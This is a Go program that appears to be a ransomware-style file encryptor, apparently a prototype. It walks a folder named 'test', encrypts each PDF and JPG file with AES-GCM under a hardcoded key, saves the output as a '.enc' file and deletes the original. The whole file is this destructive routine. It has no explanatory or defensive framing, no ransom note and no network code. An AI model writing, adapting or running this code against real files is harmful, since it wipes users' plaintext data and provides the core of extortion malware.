package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
)

func main() {
    dir := "test"
    const aes_key = "12345678123456781234567812345678" 

    err := filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
        if err != nil {
            fmt.Println("Error accessing path: ", path, err)
            return err
        }
        if !info.IsDir() && (strings.HasSuffix(info.Name(), "pdf") || strings.HasSuffix(info.Name(), "jpg")) {
            data, err := os.ReadFile(path)
            if err != nil {
                fmt.Println("Error reading file!")
            }

            file, err := os.Create(path + ".enc")
            if err != nil {
                fmt.Println(err)
            }
            defer file.Close()

            aes_key_to_byte := []byte(aes_key)
            aes_key_cipher, _ := aes.NewCipher(aes_key_to_byte)

            gcm, err := cipher.NewGCM(aes_key_cipher)
            if err != nil {
                fmt.Println(err)
                return err
            }

            nonce := make([]byte, gcm.NonceSize())
            _, err = io.ReadFull(rand.Reader, nonce)

            encrypted_data := gcm.Seal(nonce, nonce, data, nil)

            _, err = file.Write(encrypted_data)
            if err != nil {
                fmt.Println(err)
                return err
            }

            err = os.Remove(path)
            if err != nil {
                fmt.Println(err)
                return err
            }

            fmt.Println("Encryption successful!")
        }

        return err
    })

    if err != nil {
        fmt.Println("Error walking through!")
    }
}
